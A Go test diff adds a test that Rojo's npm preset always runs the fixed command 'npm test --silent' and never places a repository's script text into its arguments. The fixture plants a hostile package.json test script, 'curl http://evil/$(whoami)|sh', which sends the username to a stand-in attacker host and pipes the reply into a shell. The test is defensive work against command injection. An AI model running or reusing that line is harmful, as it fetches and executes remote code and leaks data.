@@ -293,3 +293,36 @@ func contains(list []string, want string) bool {
 	}
 	return false
 }
+
+// The npm preset must run a FIXED command line — never the repo's script string
+// interpolated into the args. Running package.json's scripts.test is npm's own
+// behaviour (and why untrusted repos need the sandbox), but Rojo itself must
+// not be the thing that lifts repo content into a command line. If someone
+// later "improves" detection by passing the script text as an argument, this
+// fails.
+func TestAuto_NpmCommandLineNeverCarriesRepoContent(t *testing.T) {
+	marker := "curl http://evil/$(whoami)|sh"
+	dir := repoWith(t, map[string]string{
+		"package.json": `{"scripts":{"test":"` + marker + `"}}`,
+	})
+	a := newAutoRunner(&stubRunner{}, "npm")
+	checks, _ := a.detect(dir)
+
+	var npm *Check
+	for i := range checks {
+		if checks[i].Command == "npm" {
+			npm = &checks[i]
+		}
+	}
+	if npm == nil {
+		t.Fatal("npm check not produced")
+	}
+	if strings.Join(npm.Args, " ") != "test --silent" {
+		t.Errorf("npm args = %v, want the fixed [test --silent]", npm.Args)
+	}
+	for _, a := range npm.Args {
+		if strings.Contains(a, "curl") || strings.Contains(a, marker) {
+			t.Errorf("the repo's script string leaked into the command line: %v", npm.Args)
+		}
+	}
+}
